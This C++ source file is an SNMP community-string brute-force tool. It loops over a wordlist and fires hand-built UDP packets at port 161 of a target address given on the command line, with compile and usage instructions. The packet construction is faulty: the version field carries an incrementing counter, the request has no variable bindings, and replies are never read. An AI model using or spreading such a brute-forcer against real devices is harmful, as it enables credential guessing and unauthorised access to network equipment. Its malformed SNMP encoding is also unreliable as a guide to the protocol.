// ============================================================
// snmp_brute.cpp — SNMP v1/v2c community brute
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o snmp_brute snmp_brute.cpp
// Usage:   ./snmp_brute <target_ip> <wordlist>
// ============================================================
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdio>
#include <cstring>
#include <fstream>
#include <string>

int main(int argc, char** argv) {
    if (argc < 3) return 1;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(161);
    inet_pton(AF_INET, argv[1], &dst.sin_addr);

    std::ifstream wl(argv[2]);
    std::string community;
    uint8_t pkt[64];
    int seq = 1;

    while (std::getline(wl, community)) {
        memset(pkt, 0, sizeof(pkt));
        int len = 0;
        pkt[len++] = 0x30; pkt[len++] = 26;
        pkt[len++] = 0x02; pkt[len++] = 1; pkt[len++] = seq++;
        pkt[len++] = 0x04; pkt[len++] = (uint8_t)community.size();
        memcpy(pkt + len, community.data(), community.size());
        len += community.size();
        pkt[len++] = 0xA0; pkt[len++] = 12;
        pkt[len++] = 0x02; pkt[len++] = 4; pkt[len++] = 0; pkt[len++] = 0; pkt[len++] = 0; pkt[len++] = 1;
        pkt[len++] = 0x02; pkt[len++] = 1; pkt[len++] = 0;
        pkt[len++] = 0x02; pkt[len++] = 1; pkt[len++] = 0;
        pkt[1] = len - 2;

        sendto(s, pkt, len, 0, (sockaddr*)&dst, sizeof(dst));
        // Response handling omitted; add recvfrom for validation
        std::printf("tried: %s\n", community.c_str());
    }
    return 0;
}
